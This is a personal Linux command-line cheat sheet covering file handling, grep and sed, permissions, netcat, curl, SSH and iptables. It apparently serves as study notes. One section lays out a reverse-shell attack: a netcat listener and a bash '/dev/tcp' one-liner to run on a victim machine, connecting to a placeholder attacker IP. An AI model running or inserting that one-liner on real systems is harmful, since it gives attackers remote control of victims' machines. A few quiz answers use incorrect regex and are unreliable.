# Command Line Cheat Sheet

## Navigation

- `~`: Home
- `$`: Path end of Regular User Prompt
- `#`: Path end of Root User Prompt
- `/`: Root Directory
- `..`: Parent Directory
- `./`: Current Directory
- `*`: Wildcard (Matches any character or group of characters)
- `*`: can also mean all the files and folders of current directory
- `<` or `0`: standard input
- `>` or `1`: standard output
- `&` or `2`: standard error

### Example Path:

```bash
~/Y_E_@_S_E_EN/CSE3032/Folder1$
```

### Variables

```bash
abc=7
echo "$abc"
7
```

# List all files and folders in the current location

- `*`: all files and folders in the current location

```bash
myfiles=(\*)
echo "$myfiles"
echo "{myfiles[0]}"
echo "${myfiles[0]}"

#both stdout and stderr of the echo command are redirected to a file named output.txt. If there's an error, it will also be captured in the file.
echo "Hello, world!" >& output.txt

#This one-liner discards both stdout and stderr by redirecting them to /dev/null. It's useful when you want to suppress output.
command_that_might_produce_output >& /dev/null

#List the contents of the current directory, and if there are any errors,include them in the output,then display everything using cat.
#2>&1 means "redirect standard error to the same location as standard output."
#By default, when you run a command, stdout and stderr are separate. 2>&1 is used to merge them, so both regular output and error messages are directed to the same place.
ls 2>&1 | cat

#see the user name
whoami

# Clear terminal
clear

# Print current directory
pwd

# List files and folders
ls

# List all files and folders (including hidden ones)
ls -A

#list all files and directories in the current directory and its subdirectories
ls *

#List all of the files in the current directory and all of its subdirectories that end in ".txt"
ls */*txt

#This will output a comprehensive set of information about the file "myfile.txt."
stat abc.txt

#In string format, %U represents the username of the file owner.
stat --format "%U" abc.txt

#This would display a custom format with file name, size, owner, and group information.
stat --format "File: %n Size: %s bytes Owner: %U Group: %G" abc.txt

# Create a folder
mkdir Folder1

# Change directory
cd Folder1

# Move back to the parent directory
cd ..

# Create a folder with spaces
mkdir "child number three"
mkdir child\ number\ three
mkdir "my tree speaks as if I didn't"
mkdir a\'b
mkdir a\*b
mkdir a\\b

# Remove a directory
rmdir my

# Remove a file
rm abc.txt

#Multiple folder creation and deletion
mkdir a b c d e f g h i j
rmdir a b c d e f h g j i

#Recursively delete a folder and its children
rm -r childOfFolder1

#* == all files in a folder
cat *
ls *
#: Copies all files and folders in the current directory to the specified destination.
cp * destination_path


#Run multiple cmds in a single line: first ls will execute, then date
ls ; date

#Run "date" if "ls" is successful
ls && date

#Run "date" if "ls" is not successful: date will not execute
ls || date

#Run "date" if "lk" is not successful: date will execute as "lk" command is failed
lk || date
```

# File manipulation

```bash
# Open a text file in the nano editor
nano abc.txt
#If you want to write something, then type what you want to write at this step.
#Press ctrl+X
#Type 'y'
#Press 'Enter' Button

# Open a text file in the vim editor
vim newfile.txt
#follow vim's features

# Move a file
mv abc.txt LocationToMove

# Rename a file
mv abc.txt superman.txt

# Copy a file
cp abc.txt LocationToMove
cp full_path_of_SOURCE_FILE full_path_where_to_move

# Display file content
cat superman.txt

# Display line numbers in a file
cat -n superman.txt

# Display end-of-line characters in a file

file superman.txt

```

# Text Manipulation

## Concatenation and Appending

```bash
# Concatenate files
cat batman.txt superman.txt > batmanvssuperman.txt

# Append content to a file
cat wonderwoman.txt >> batmanvssuperman.txt


#put standard output of the "ls -A" command to file.txt
ls -A > file.txt

#append standard output of the "cat file2.txt" command to file.txt
cat file2.txt >> file.txt

#Discard stdout of ls command
ls > /dev/null

#pipelining: the output of "ls -A" will be the input to "wc -l" command
ls -A | wc -l

# Print lines 10 to 15 of a file
sed -n '10,15p' file1.txt

# Append lines 10 to 15 of file1.txt to file2.txt
sed -n '10,15p' file1.txt >> file2.txt

#extracting human-readable text from "data.txt" and searching for lines containing the exact string '==' in a case-insensitive manner
strings data.txt | grep -wi '=='

#decoding a Base64-encoded content from "data.txt" and revealing its original form
cat data.txt | base64 --decode

#Create Hex Dump from a File: This will display the hexadecimal representation along with ASCII characters of each byte in "data.txt."
xxd data.txt

#Create Hex Dump and Redirect to a File: Saves the hex dump of "data.txt" to a file named "hexdump.txt."
xxd data.txt > hexdump.txt

#Convert Hex Dump Back to Binary: Takes the hex dump from "hexdump.txt" and converts it back to binary, saving it as "original_data."
xxd -r hexdump.txt > original_data

#first create hexdump of abc.txt and feed it to xxd with -r option to print the orginal binary ouput
xxd abc.txt | xxd -r

#Hex Dump with Line Numbers: Displays hex dump with 8 bytes per line and includes line numbers.
xxd -c 8 data.txt

#Extracts the second field using a pipe (|) as the delimiter.
echo "name|age|gender" | cut -d '|' -f 2

#This extracts the first and third fields from a CSV file where commas (,) are the delimiters.
cut -d ',' -f 1,3 file.csv
```

# Basic File Comparison and Similarities: Difference using diff cmd

```bash
#Basic File Comparison:
diff file1.txt file2.txt

#Unified Diff Format: Provides a unified diff format, which is often easier to read and understand.
diff -u file1.txt file2.txt

#Recursive Directory Comparison:Compares files in "dir1" and "dir2" recursively.
diff -r dir1 dir2

#Ignores whitespace differences in the comparison.
diff -w file1.txt file2.txt

#Creates a patch file containing the differences between the two files.
diff -u file1.txt file2.txt > my_patch.patch

#taking the contents of "data.txt," sorting them, and then keeping only the unique lines.
cat data.txt | sort | uniq -u

#frequencies per line of a txt file
sort abc.txt | uniq -c

#In order to sort the output with the most frequent lines on top, you can do the following
sort abc.txt | uniq -c | sort -nr

#to get only duplicate lines, most frequent first:
sort abc.txt | uniq -cd | sort -nr

#Say, you have two files and you want to get the actual content of the common lines:
#-F treats the patterns as fixed strings, -x matches whole lines, and -f specifies the file with the patterns.
grep -Fxf <(sort abc.txt) <(sort def.txt)

#you can also use comm command to get the same output as well
comm -12 <(sort abc.txt) <(sort def.txt)
```

# Word Count

```bash
# Count lines, words, characters, and bytes in a file
wc -lwmc filename

# Count lines, words, and characters in a file but using pipelining
cat filename | wc -lwmc

# Count lines, words, and characters in all files in the current directory
cat * | wc -lwmc
```

# File Search

```bash
#find binary/source for command
whereis ls


#we want to search a file and want to avoid anything you haven't access to parts of the filesystem
find / -name "index.html" 2>/dev/null
find / -name "index.html" 2>&-


# Find files with a specific name
#here, . is for current directory * is for pattern matching
find . -type f -name abc.txt
find . -type f -name 'm*l.txt'
find . -type f -iname 'p*m*l.*'

# Delete all PDF files in a directory
find . -type f -name "*.pdf" -exec rm -f {} \;

#find: This command is used to search for files and directories in a directory hierarchy.
#.: Specifies the starting directory for the find command. In this case, it starts the search from the current directory.
#-type f: Specifies the type of the found items. In this case, it looks for regular files.
#-name "*.pdf": Filters the search based on the name of the files. Here, it's looking for files with names ending in ".pdf".
#-exec: Executes a command on the files found by find.
#rm -f {}: The command to be executed. It removes files forcefully (-f). {} is a placeholder for each file found by find, and it gets replaced by the actual file names.
#\;: Indicates the end of the -exec command. It needs to be terminated with a semicolon.


# Display the content of all text files
find . -type f -name "*.txt" -exec cat {} \; | wc -lw

# Searching Patterns

## rg command

```bash
#The rg command is a fast, ripgrep line-oriented search tool that recursively searches your current directory for a regex pattern.
#You may need to install it

#Searches for the specified pattern in the file.txt file.
rg "pattern" file.txt

#Recursive Search in Current Directory:
rg "pattern"

#Case-Insensitive Search:
rg -i "pattern"

#Search for Whole Words Only:
rg -w "pattern"

#Search for Lines Not Matching a Pattern:
rg -v "pattern"

#Count the Number of Matches:
rg -c "pattern"

#Search for Files Containing the Pattern:
rg -l "pattern"

#Search for a Specific File Type with a pattern:
rg --type md "pattern"

#Search for Multiple Patterns (OR): Searches for lines containing either pattern1 or pattern2.
rg "pattern1|pattern2"

#Search for Multiple Patterns (AND): Searches for lines containing both pattern1 and pattern2.
rg -e "pattern1" -e "pattern2"

#Exclude Files or Directories: Excludes files listed in skip.txt and the directory named exclude_folder from the search.
rg "pattern" --ignore-file=skip.txt --ignore-dir=exclude_folder

```

## Grep commands

```bash
#-o == only matched part will be portrayed
#-i == case insensetive
#-w == only for matched WORD
# Grep command with options
grep -oi 'c' batman.txt | wc -w
grep -owi 'man' batman.txt | wc -w

# Grep with head and tail
head -n 3 superman.txt | grep -o 'o' | wc -w
tail -n 3 superman.txt | grep -o 'o' | wc -w

# Combined Grep
{ grep -ow 'ASUS' batman.txt && grep -owi 'ASUS' superman.txt } | wc -w

#Q0. Find the number of the occurences of 'man' in the first seven lines of the superman.txt file.
head -n 7 superman.txt | grep -o 'man' | wc -l

#Q1. Write a command line that can print the frequencies of a string that starts with ‘p’ and ends with ‘t’ in the last 20 lines of abc.txt file and the first seven
lines of pqr.txt file. [Use regex]

{ tail -n 20 abc.txt | grep -oi 'p*t' && head -n 7 superman.txt | grep -o 'p*t'} | wc -w


# Count occurrences in the first seven lines
head -n 7 superman.txt | grep -o 'man' | wc -l

```

# Permissions and Operations

```bash
# Change file permissions
#Permission:: r = read; w = write; x = execute
#Owner's Permission	 group's permission         random users' permission
#     Current:    rwx rwx rwx
#                 111 111 111
#      After:      -wx r-x ---
#		  011 101 000
chmod 350 filename

#      After:      rwx r-x ---
#		  111 101 000
chmod 750 filename

#recursively change on all subdirectories as well
chmod -R 744 folderName

#to give all permission
chmod +x script.sh

#Grants read (r) and write (w) permissions to the owner (u) of the directory.
chmod -R u+rw folder

#Remove read write and execute bits for "other" and "group" on all files in folder
chmod -R og-rwx

# Give other and group the same rights as user, but removing writing rights.
chmod -R og=u-w folder

#Sticky Bit (t): When the sticky bit is set on a directory, only the owner of a file within that directory can delete or rename the file. It's commonly used on directories like /tmp to prevent users from deleting or modifying each other's files.
#Represented by a lowercase "t" in the "others" permission of the directory.
chmod +t directory

#setting the sticky bit on a directory for others (everyone else, not the owner).after running this command, the sticky bit will be set for others on the specified directory.
chmod o+t folder

#Setuid (s) and Setgid (s) Bits:
#Setuid (s) and setgid (s) are special permissions that can be set on executable files.
#Setuid: When set on an executable file, it runs with the privileges of the file owner.
#Setgid: When set on an executable file, it runs with the privileges of the group owner of the file.
#Represented by an uppercase "S" (if the corresponding execute bit is not set) or "s" (if the execute bit is set).
chmod u+s executable_file   # Setuid
chmod g+s executable_file   # Setgid

# Replace second occurrence
sed 's/unix/linux/2' geekfile.txt

# Global replacement
sed 's/unix/linux/g' geekfile.txt

# Replace on a specific line number
sed '3 s/unix/linux/' geekfile.txt

# Explaining the `lshw -C network` Command

## Overview

The `lshw` command is a hardware information tool available on Linux systems. When used with the `-C` flag followed by a specific class (in this case, `network`), it provides detailed information about the network hardware on your system.

## Command Syntax

```bash
lshw -C network

#lshw: This is the main command for listing hardware information.
#-C network: The -C flag specifies the class of hardware you want information about, and in this case, it's set to network.
sudo ifup <logical_name_of_interface>

sudo ifdown <logical_name_of_interface>
```

# Netcat (nc) Command Examples

## 1. Basic Usage - Listening on a Port

```bash
#Basic Chat application:
#- `l`: Listen mode, for inbound connections.
#- `p` 1234: Specifies the port to listen on (replace 1234 with your desired port).
#- `v`: verbose mode, i.e., Display more information about the connection.
#server(localhost) is listening at 1234
nc -lvp 1234
#Client from another tab connects to the loacthost server at 1234
nc localhost 1234
```

## 2. Basic Usage - Connecting to a Host and Port

```bash
#Connects from CLIENT to the host at IP address 10.0.2.5 on port 1234.
nc 10.0.2.5 1234

#Listens on port 1234 and saves the received data to a file named received_file.txt.
nc -l -p 1234 > received_file.txt
#Connects to the host at IP address 10.0.2.5 on port 1234 and sends the contents of file_to_send.txt.
nc 10.0.2.5 1234 < file_to_send.txt
```

## 3. A reverse shell attack

```bash
#Say attacker is listening at 1234
nc -lvp 1234

#the following one-liner has to executed from the victim's machine
#it could be done if the victim is running any unpatched version software that can execute shell command
bash -i >& /dev/tcp/[attacker IP]/[attacker port] 0>&1
#bash -i: This starts an interactive Bash shell.
#>&: This is a redirection operator that combines the standard output (stdout) and standard error (stderr).
#/dev/tcp/[attacker IP]/[attacker port]: This part is using Bash's built-in functionality to create a TCP connection to the specified IP address and port. It essentially connects the shell to a remote machine.
#0>&1: This redirects the input (stdin) to the combined stdout and stderr, completing the connection.
```

# The mighty curl!

```bash
#This command downloads a file from the specified URL (https://example.com/file.txt) and saves it with the same name locally.
curl -O https://example.com/file.txt

#The --progress-bar option displays a progress bar during the download.
curl -O https://example.com/largefile.zip --progress-bar

#Sending Data with a POST Request:This sends a POST request to the specified URL (https://example.com/api) with the specified data.
curl -X POST -d "param1=value1&param2=value2" https://example.com/api

#Sending JSON Data in a POST Request:This example sends a POST request with JSON data to an API.
curl -X POST -H "Content-Type: application/json" -d '{"key": "value"}' https://example.com/api

#Uploading a File:This uploads a local file (localfile.txt) to an FTP server.
curl -T localfile.txt ftp://ftp.example.com/upload/

# Authenticating with Basic Auth:
curl -u username:password https://example.com/api

#Displaying HTTP Headers:The -I option fetches the headers only, without downloading the body content.
curl -I https://yeaseen.github.io

#This command is effectively saying: "Download the file from the specified URL (https://example.com), follow any redirects (-L), and save it locally with the same name as the remote file (-O). Additionally, download the entire content of the file (-r with no specified range).
curl -O -L -r https://example.com

```

# In the same network,(Host and Virtual Oses) File Transfer between two machines using python server

```bash
#Start the HTTP server on the machine with the file you want to share:
#Open host/server terminal, navigate to the directory containing the file, and run:
python3 -m http.server 80

#From client terminal:
wget http://<SERVER_IP>/<file_name>
#Or
#Access the server from another machine:
#Open a web browser on the second machine and enter the IP address or hostname of the first machine, followed by the port number.

# SSH-ing
```bash
#Connecting to a remote/another machine
ssh -p <PORT> username@ip_addr

#Set-up client for SSH-ing to host
#Step-1: Generate a public-private key pair
mkdir ~/.ssh
cd .ssh
ssh-keygen -t rsa -b 4096 -o -a 100
chmod 600 *
#Step-2: Copy your public key to host's ~/.ssh/authorized_keys file
#The following command connects to the specified remote host as the specified user
#Put the user's password on the remote host PC
ssh-copy-id <username>@<hostname>


#-->How to modify default SSH port 22 to something new: change in SSH configuration file
nano /etc/ssh/sshd_config
#Look for the line that starts with Port. It will specify the port number that SSH is configured to use.
#Change it by replacing 22 with your NEW_PORT
Port <NEW_PORT>
service ssh restart
```

# Copy files between two different network remotely
```bash
#copy file(s) from the host to your client (note the capital -P)
scp -P <PORT> username@host_ip_addr:path_to_src local_dest

#copy file(s) from your client to the host (note the capital -P)
scp -P <PORT> local_src username@host_ip_addr:path_to_dest
```

# Linux Firewall Command [iptables]
```bash
#Check Current Rules:
iptables -L

#Flush all Rules, effectively turning off the firewall
iptables -F

#Allow Incoming SSH (replace 22 with your SSH port if it's different): ssh config file located at /etc/ssh/sshd_config
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

#Allow Incoming HTTP (port 80):
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

#Allow all Outgoing Connections:
iptables -A OUTPUT -j ACCEPT

#Deny All Incoming Traffic:
iptables -A INPUT -j DROP

#Save them so they persist after a reboot
service iptables save

#Start/Stop/Restart Firewall:
service iptables start
service iptables stop
service iptables restart
